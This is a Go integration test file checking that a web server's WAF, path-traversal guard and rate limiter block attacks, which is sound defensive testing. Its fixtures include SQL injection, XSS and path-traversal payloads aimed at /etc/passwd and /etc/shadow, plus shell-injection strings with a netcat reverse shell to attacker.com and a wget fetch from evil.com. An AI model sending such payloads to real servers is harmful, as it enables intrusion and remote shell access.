package integration

// Security middleware behavior integration tests.
//
// These tests verify that the security layer (WAF, path traversal prevention,
// rate limiting) behaves correctly under realistic attack scenarios — not
// just that the regex patterns compile. They replace coverage-chasing tests
// with threat-model-driven behavior contracts.
//
// What these tests prove:
//   1. WAF blocks SQL injection in URL
//   2. WAF blocks XSS in URL
//   3. WAF blocks path traversal in URL
//   4. WAF blocks shell injection in URL
//   5. WAF allows legitimate requests
//   6. Path traversal prevention works (symlink + ../)
//   7. Rate limiter blocks after threshold

import (
	"context"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/uwaserver/uwas/internal/logger"
	"github.com/uwaserver/uwas/internal/middleware"
	"github.com/uwaserver/uwas/internal/pathsafe"
)

func newTestLogger() *logger.Logger {
	return logger.New("error", "text")
}

func newTestSecurityStats() *middleware.SecurityStats {
	return middleware.NewSecurityStats()
}

// ── WAF URL scanning ──

// TestWAF_BlocksSQLInjection verifies that SQL injection patterns in the URL
// are blocked by the WAF guard.
func TestWAF_BlocksSQLInjection(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	attackURLs := []string{
		"/page?id=1%20UNION%20SELECT%20%2A%20FROM%20users",
		"/search?q=%27%3B%20DROP%20TABLE%20users%3B%20--",
		"/api?cmd=1%3B%20DELETE%20FROM%20orders%20WHERE%201%3D1",
	}

	for _, attackURL := range attackURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+attackURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if allowed {
			t.Errorf("SQL injection not blocked: %s", attackURL)
		}
		if rec.Code != http.StatusForbidden {
			t.Errorf("expected 403 for %s, got %d", attackURL, rec.Code)
		}
	}
}

// TestWAF_BlocksXSS verifies that XSS payloads in the URL are blocked.
func TestWAF_BlocksXSS(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	attackURLs := []string{
		"/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
		"/page?x=javascript%3Aalert%28document.cookie%29",
		"/img?src=x%20onload%3Dalert%281%29",
	}

	for _, attackURL := range attackURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+attackURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if allowed {
			t.Errorf("XSS not blocked: %s", attackURL)
		}
	}
}

// TestWAF_BlocksPathTraversal verifies that ../ in the URL is blocked.
func TestWAF_BlocksPathTraversal(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	attackURLs := []string{
		"/../../../etc/passwd",
		"/files/../../config/database.yml",
		"/static/..\\..\\windows\\system32",
	}

	for _, attackURL := range attackURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+attackURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if allowed {
			t.Errorf("Path traversal not blocked: %s", attackURL)
		}
	}
}

// TestWAF_BlocksShellInjection verifies that shell injection patterns are blocked.
func TestWAF_BlocksShellInjection(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	attackURLs := []string{
		"/cmd?exec=%3Bcat%20/etc/passwd",
		"/run?x=%7Cnc%20-e%20/bin/sh%20attacker.com%204444",
		"/page?cmd=%24%28wget%20http://evil.com/shell.sh%29",
	}

	for _, attackURL := range attackURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+attackURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if allowed {
			t.Errorf("Shell injection not blocked: %s", attackURL)
		}
	}
}

// TestWAF_BlocksSensitiveFiles verifies that attempts to access /etc/passwd,
// /proc/self, etc. via URL are blocked.
func TestWAF_BlocksSensitiveFiles(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	attackURLs := []string{
		"/page?file=/etc/passwd",
		"/page?file=/etc/shadow",
		"/debug?proc=/proc/self/environ",
	}

	for _, attackURL := range attackURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+attackURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if allowed {
			t.Errorf("Sensitive file access not blocked: %s", attackURL)
		}
	}
}

// TestWAF_AllowsLegitimateRequests verifies that normal requests pass the WAF.
func TestWAF_AllowsLegitimateRequests(t *testing.T) {
	stats := newTestSecurityStats()
	guard := middleware.DomainWAFGuard(newTestLogger(), nil, nil, stats)

	legitURLs := []string{
		"/",
		"/index.html",
		"/blog/my-first-post",
		"/api/v1/users?page=1&limit=10",
		"/search?q=hello+world",
		"/static/css/main.css?v=12345",
	}

	for _, legitURL := range legitURLs {
		req := httptest.NewRequest(http.MethodGet, "https://example.com"+legitURL, nil)
		rec := httptest.NewRecorder()
		allowed := guard(rec, req)
		if !allowed {
			t.Errorf("Legitimate request blocked: %s (code=%d)", legitURL, rec.Code)
		}
	}
}

// TestWAF_BypassPaths verifies that configured bypass paths skip the WAF.
func TestWAF_BypassPaths(t *testing.T) {
	stats := newTestSecurityStats()
	bypassPaths := []string{"/webhook/", "/api/callback"}
	guard := middleware.DomainWAFGuard(newTestLogger(), bypassPaths, nil, stats)

	// A URL that would normally be blocked by WAF, but is in a bypass path
	req := httptest.NewRequest(http.MethodPost, "https://example.com/webhook/drop", strings.NewReader("x=<script>alert(1)</script>"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	allowed := guard(rec, req)
	if !allowed {
		t.Errorf("Bypass path should be allowed: %s", req.URL.Path)
	}
}

// ── Path traversal prevention (pathsafe) ──

// TestPathTraversal_RejectsParentDir verifies that pathsafe.Base.Contains
// rejects paths that escape the document root via ../.
func TestPathTraversal_RejectsParentDir(t *testing.T) {
	docRoot := t.TempDir()
	base, err := pathsafe.CachedBase(docRoot)
	if err != nil {
		t.Fatalf("CachedBase: %v", err)
	}

	escapeAttempts := []string{
		filepath.Join(docRoot, "../../../etc/passwd"),
		filepath.Join(docRoot, "..", "..", "config", "secrets.yml"),
		filepath.Join(docRoot, "subdir/../../../root/.ssh/id_rsa"),
	}

	for _, attempt := range escapeAttempts {
		if base.Contains(attempt) {
			t.Errorf("Path traversal not caught: %s", attempt)
		}
	}
}

// TestPathTraversal_AcceptsValidPaths verifies that paths within the docroot
// pass containment checks.
func TestPathTraversal_AcceptsValidPaths(t *testing.T) {
	docRoot := t.TempDir()
	base, err := pathsafe.CachedBase(docRoot)
	if err != nil {
		t.Fatalf("CachedBase: %v", err)
	}

	validPaths := []string{
		filepath.Join(docRoot, "index.html"),
		filepath.Join(docRoot, "css", "main.css"),
		filepath.Join(docRoot, "images", "logo.png"),
		filepath.Join(docRoot, "blog", "2024", "post1.html"),
	}

	for _, path := range validPaths {
		if !base.Contains(path) {
			t.Errorf("Valid path rejected: %s", path)
		}
	}
}

// TestPathTraversal_IsWithinBase verifies the standalone IsWithinBase function.
func TestPathTraversal_IsWithinBase(t *testing.T) {
	base := "/var/www/example.com"

	if pathsafe.IsWithinBase(base, "/var/www/example.com/../../../etc/passwd") {
		t.Error("../../../ should be rejected")
	}
	if !pathsafe.IsWithinBase(base, "/var/www/example.com/index.html") {
		t.Error("valid path should be accepted")
	}
}

// ── Rate limiting ──

// TestRateLimit_BlocksAfterThreshold verifies that the rate limiter starts
// blocking requests after the configured limit is exceeded.
func TestRateLimit_BlocksAfterThreshold(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	limit := 5
	window := 10 * time.Second
	rl := middleware.NewRateLimiter(ctx, limit, window)
	defer rl.Stop()

	ip := "192.168.1.100"

	// First `limit` requests should be allowed
	for i := 0; i < limit; i++ {
		if !rl.Allow(ip) {
			t.Fatalf("request %d should be allowed (limit=%d)", i+1, limit)
		}
	}

	// Request beyond limit should be blocked
	if rl.Allow(ip) {
		t.Error("request beyond limit should be blocked")
	}
}

// TestRateLimit_AllowsDifferentIPs verifies that rate limiting is per-IP —
// one IP hitting the limit doesn't block another.
func TestRateLimit_AllowsDifferentIPs(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	limit := 3
	rl := middleware.NewRateLimiter(ctx, limit, time.Minute)
	defer rl.Stop()

	// Exhaust the limit for IP A
	for i := 0; i < limit; i++ {
		rl.Allow("10.0.0.1")
	}
	if rl.Allow("10.0.0.1") {
		t.Error("IP A should be rate-limited")
	}

	// IP B should still be allowed
	if !rl.Allow("10.0.0.2") {
		t.Error("IP B should not be rate-limited")
	}
}

// TestRateLimit_AllowsUnderThreshold verifies that requests under the limit
// are all allowed.
func TestRateLimit_AllowsUnderThreshold(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	limit := 100
	rl := middleware.NewRateLimiter(ctx, limit, time.Minute)
	defer rl.Stop()

	for i := 0; i < 50; i++ {
		if !rl.Allow("172.16.0.1") {
			t.Fatalf("request %d should be allowed (limit=%d)", i+1, limit)
		}
	}
}
